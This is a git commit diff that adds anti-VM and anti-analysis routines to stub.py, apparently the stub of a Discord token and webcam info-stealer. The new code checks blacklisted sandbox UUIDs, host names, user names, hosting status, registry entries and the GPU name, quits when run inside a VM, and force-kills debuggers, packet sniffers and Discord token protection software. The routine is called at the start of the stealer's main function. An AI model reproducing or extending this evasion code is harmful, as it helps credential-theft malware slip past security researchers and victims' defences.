484f17801fff3ece1fb570ecad0b4d7312d28975
anoncx <108609556+anoncx@users.noreply.github.com>
2023-12-07 19:36:59 +0100

    added anti vm

--- stub.py
+++ stub.py
@@ -19,6 +19,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 from mss import mss
 from Cryptodome.Cipher import AES
 from Crypto.Cipher import AES
+from urllib3 import PoolManager
 
 user = os.environ.get("USERNAME")
 local = os.getenv('LOCALAPPDATA')
@@ -301,6 +302,138 @@ def getDcToken():
     main_tokens()
 
 
+# Kill Task
+
+def TaskKill(*tasks: str) -> bool:  # Tries to kill given processes
+    tasks = list(map(lambda x: x.lower(), tasks))
+    out = (subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(
+        errors='ignore')).strip().split('\r\n\r\n')
+    for i in out:
+        i = i.split("\r\n")[:2]
+        try:
+            name, pid = i[0].split()[-1], int(i[1].split()[-1])
+            name = name[:-4] if name.endswith(".exe") else name
+            if name.lower() in tasks:
+                subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
+                return True
+        except Exception:
+            return False
+            pass
+
+
+# AntiVm
+
+
+def AntiVm():
+    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009',
+                         '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
+                         '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548',
+                         '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972',
+                         '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
+                         '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022',
+                         '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65',
+                         'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
+                         'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C',
+                         '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363',
+                         '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
+                         '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A',
+                         '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB',
+                         '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
+                         'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250',
+                         '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C',
+                         '9961A120-E691-4FFE-B67B-F0E4115D5919')
+    BLACKLISTED_COMPUTERNAMES = (
+        'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh',
+        'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6',
+        'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs',
+        'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh',
+        'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
+    BLACKLISTED_USERS = (
+        'wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank',
+        '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss',
+        '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
+    BLACKLISTED_TASKS = (
+        'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray',
+        'vmtoolsd',
+        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc',
+        'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient',
+        'ksdumper',
+        'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
+
+    def checkUUID():
+        uuid = subprocess.run("wmic csproduct get uuid", shell=True, capture_output=True).stdout.splitlines()[2].decode(
+            errors='ignore').strip()
+        return uuid in BLACKLISTED_UUIDS
+
+    def checkComputerName() -> bool:  # Checks if the computer name of the user is blacklisted or not
+        computerName = os.getenv("computerName")
+        return computerName.lower() in BLACKLISTED_COMPUTERNAMES
+
+    def checkUsers() -> bool:  # Checks if the username of the user is blacklisted or not
+        userN = os.getlogin()
+        return userN.lower() in BLACKLISTED_USERS
+
+    def checkHosting() -> bool:  # Checks if the user's system in running on a server or not
+        http = PoolManager(cert_reqs="CERT_NONE")
+        try:
+            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(
+                errors="ignore").strip() == 'true'
+        except Exception:
+            print("Not Ale To Check Hosting")
+            return False
+
+    def checkRegistry() -> bool:  # Checks if user's registry contains any data which indicates that it is a VM or not
+        print("Checking Registry")
+        r1 = subprocess.run(
+            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2",
+            capture_output=True, shell=True)
+        r2 = subprocess.run(
+            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2",
+            capture_output=True, shell=True)
+        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output=True,
+                                                   shell=True).stdout.decode(errors="ignore").splitlines()[
+            2].strip().lower() for x in ("virtualbox", "vmware"))
+        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
+        return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
+
+    def killTasks() -> bool:  # Kills blacklisted processes
+        if TaskKill(*BLACKLISTED_TASKS):
+            return False
+        else:
+            return True
+
+    def checkVm():
+        IsVm = False
+        if checkUUID():
+            IsVm = True
+            print("Failed UUID Check")
+        elif checkComputerName():
+            IsVm = True
+            print("Failed Pc Name Check")
+        elif checkUsers():
+            IsVm = True
+            print("Failed Username Check")
+        elif checkHosting():
+            IsVm = True
+            print("Failed Hosting Check")
+        elif checkRegistry():
+            IsVm = True
+            print("Failed Registry Check")
+        else:
+            IsVm = False
+            print("Passed All Checks")
+        if killTasks():
+            print("Killed Blacklisted Processes")
+        else:
+            print("Failed To Kill Tasks")
+        return IsVm
+
+    if checkVm():
+        exit(0)
+    else:
+        print("Continuing After CheckVm")
+
+
 # Clean Up
 def cleanUp():
     shutil.rmtree(Aqua)
@@ -315,6 +448,7 @@ webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252
 
 
 def runAqua():
+    AntiVm()
     makeDir()
     takeSS()
     getCam()
